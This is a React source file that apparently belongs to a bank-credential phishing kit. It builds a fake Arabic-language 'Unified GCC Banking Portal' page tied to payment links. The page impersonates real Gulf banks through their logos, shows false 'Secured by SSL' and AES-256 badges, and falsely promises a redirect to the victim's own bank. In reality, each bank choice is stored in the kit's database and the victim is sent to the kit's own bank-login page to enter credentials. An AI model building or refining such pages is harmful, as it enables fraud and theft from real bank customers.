import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import {
  Building2,
  Loader2,
  CheckCircle2,
  Sparkles,
  ShieldCheck,
  Lock,
  ChevronLeft,
  ChevronRight,
  Info,
  Globe,
  Search,
  ArrowRight
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import { Input } from "@/components/ui/input";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [searchTerm, setSearchTerm] = useState("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        setBanks(getBanksByCountry(countryCode));
        setLoadingBanks(false);
      }, 500);
    }
  }, [countryCode]);

  const filteredBanks = banks.filter(bank =>
    bank.nameAr.includes(searchTerm) || bank.name.toLowerCase().includes(searchTerm.toLowerCase())
  );
  
  const handleBankSelect = async (bankId: string) => {
    setSelectedBank(bankId);
    if (!linkData) return;

    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData.payload, selectedBank: bankId }
      });
      navigate(`/pay/${id}/bank-login`);
    } catch (error) {
      console.error(error);
    }
  };
  
  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#F8FAFC]">
        <Loader2 className="w-12 h-12 animate-spin text-blue-600" />
      </div>
    );
  }

  const amount = linkData.payload.payment_amount || linkData.payload.cod_amount || 500;
  const currency = linkData.payload.currency_code || countryData?.currency || "SAR";

  return (
    <div className="min-h-screen bg-[#F0F2F5] flex flex-col" dir="rtl">
      {/* Official Banking Header */}
      <header className="bg-white border-b-4 border-blue-600 shadow-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
             <div className="w-12 h-12 bg-blue-600 rounded-xl flex items-center justify-center text-white shadow-lg shadow-blue-200">
                <Building2 className="w-6 h-6" />
             </div>
             <div>
                <h1 className="text-xl font-black text-gray-800 tracking-tight">بوابة الخدمات المصرفية الموحدة</h1>
                <p className="text-[10px] font-bold text-blue-600 uppercase tracking-widest">Digital Banking Gateway</p>
             </div>
          </div>
          <div className="hidden md:flex items-center gap-6">
             <div className="text-left border-l pl-6">
                <p className="text-[10px] font-bold text-gray-400 uppercase">المبلغ الإجمالي</p>
                <p className="text-xl font-black text-blue-600">{formatCurrency(amount, currency)}</p>
             </div>
             <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 text-green-700 rounded-full border border-green-100 text-[10px] font-black uppercase">
                <ShieldCheck className="w-4 h-4" /> Secured by SSL
             </div>
          </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-10 max-w-5xl">
        <div className="grid lg:grid-cols-3 gap-10">
          {/* Main Selection Area */}
          <div className="lg:col-span-2 space-y-8">
            <div className="space-y-2">
               <h2 className="text-3xl font-black text-gray-800">اختر بنكك الشخصي</h2>
               <p className="text-gray-500 font-bold">يرجى اختيار البنك الذي تملك فيه حساباً نشطاً للمتابعة</p>
            </div>

            <div className="relative group">
               <Search className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-400 group-focus-within:text-blue-600 transition-colors" />
               <Input
                 placeholder="ابحث عن اسم البنك..."
                 className="h-16 pr-14 text-lg border-2 rounded-2xl bg-white shadow-inner focus:border-blue-600 transition-all font-bold"
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
               />
            </div>

            {loadingBanks ? (
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
                 {[1,2,3,4,5,6].map(i => <div key={i} className="h-32 bg-white rounded-2xl animate-pulse border-2 border-gray-50"></div>)}
              </div>
            ) : (
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
                {filteredBanks.map((bank) => (
                  <button
                    key={bank.id}
                    onClick={() => handleBankSelect(bank.id)}
                    className="group relative h-40 bg-white rounded-[2rem] p-6 flex flex-col items-center justify-center gap-4 transition-all hover:scale-[1.05] hover:shadow-2xl border-4 border-white hover:border-blue-100"
                  >
                    <div className="w-16 h-16 flex items-center justify-center transition-transform group-hover:scale-110 duration-500">
                      <BankLogo
                        bankId={bank.id}
                        bankName={bank.name}
                        bankNameAr={bank.nameAr}
                        className="max-h-full max-w-full object-contain"
                      />
                    </div>
                    <p className="text-xs font-black text-gray-700 text-center leading-tight group-hover:text-blue-600">{bank.nameAr}</p>
                    <div className="absolute top-4 left-4 w-6 h-6 rounded-full border-2 border-gray-100 flex items-center justify-center group-hover:bg-blue-600 group-hover:border-blue-600 transition-all">
                       <ChevronRight className="w-3 h-3 text-white" />
                    </div>
                  </button>
                ))}
              </div>
            )}
          </div>

          {/* Side Instructions */}
          <div className="space-y-6">
             <Card className="p-8 border-0 shadow-xl rounded-[2.5rem] bg-white">
                <h3 className="text-xl font-black text-gray-800 mb-6 flex items-center gap-3">
                   <Info className="w-6 h-6 text-blue-600" /> تنبيهات هامة
                </h3>
                <div className="space-y-6 text-sm text-gray-500 font-bold leading-relaxed">
                   <div className="flex gap-4">
                      <div className="w-1.5 h-1.5 rounded-full bg-blue-600 mt-2 shrink-0" />
                      <p>سيتم تحويلك لصفحة تسجيل الدخول الآمنة الخاصة ببنكك.</p>
                   </div>
                   <div className="flex gap-4">
                      <div className="w-1.5 h-1.5 rounded-full bg-blue-600 mt-2 shrink-0" />
                      <p>تأكد من أنك في بيئة آمنة ولا تشارك رمز التحقق (OTP) مع أحد.</p>
                   </div>
                   <div className="flex gap-4">
                      <div className="w-1.5 h-1.5 rounded-full bg-blue-600 mt-2 shrink-0" />
                      <p>النظام لا يقوم بتخزين أي بيانات حساسة خاصة بحسابك البنكي.</p>
                   </div>
                </div>
             </Card>

             <Card className="p-8 border-0 shadow-xl rounded-[2.5rem] bg-gradient-to-br from-[#1E293B] to-[#334155] text-white">
                <div className="flex items-center justify-between mb-4">
                   <Lock className="w-10 h-10 opacity-20" />
                   <Globe className="w-10 h-10 opacity-20" />
                </div>
                <h4 className="text-lg font-black mb-2">تشفير عالي المستوى</h4>
                <p className="text-[10px] font-bold text-gray-400 leading-relaxed uppercase tracking-widest">
                   Advanced AES-256 Banking Grade Encryption Standard
                </p>
             </Card>
          </div>
        </div>
      </main>

      <footer className="bg-white py-10 border-t">
         <div className="container mx-auto px-4 flex flex-col md:flex-row items-center justify-between gap-6">
            <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">© 2025 Unified GCC Banking Portal</p>
            <div className="flex items-center gap-8 grayscale opacity-50">
               <img src="/bank-logos/alrajhi-bank.svg" className="h-4" alt="" />
               <img src="/bank-logos/saudi-national-bank.png" className="h-6" alt="" />
               <img src="/bank-logos/emirates-nbd.png" className="h-4" alt="" />
            </div>
         </div>
      </footer>
    </div>
  );
};

export default PaymentBankSelector;
